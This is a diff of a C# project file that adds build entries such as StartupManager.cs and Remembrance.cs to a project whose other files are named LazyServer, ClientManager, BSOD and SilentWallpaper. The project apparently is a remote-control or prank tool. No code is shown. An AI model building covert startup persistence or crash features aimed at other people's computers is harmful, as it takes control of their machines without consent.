@@ -146,11 +146,14 @@
     <Compile Include="..\Classes\LazyServer.cs">
       <Link>Classes\Core\LazyServer.cs</Link>
     </Compile>
+    <Content Include="Classes\Core\Program - Copy.c" />
     <Compile Include="Classes\Helpers\BSOD.cs" />
     <Compile Include="Classes\Helpers\ClientManager.cs" />
     <Compile Include="Classes\Helpers\FlagDownloader.cs" />
     <Compile Include="Classes\Helpers\FormSlider.cs" />
+    <Compile Include="Classes\Helpers\Remembrance.cs" />
     <Compile Include="Classes\Helpers\SilentWallpaper.cs" />
+    <Compile Include="Classes\Helpers\StartupManager.cs" />
     <Compile Include="Forms\Chat.cs">
       <SubType>Form</SubType>
     </Compile>
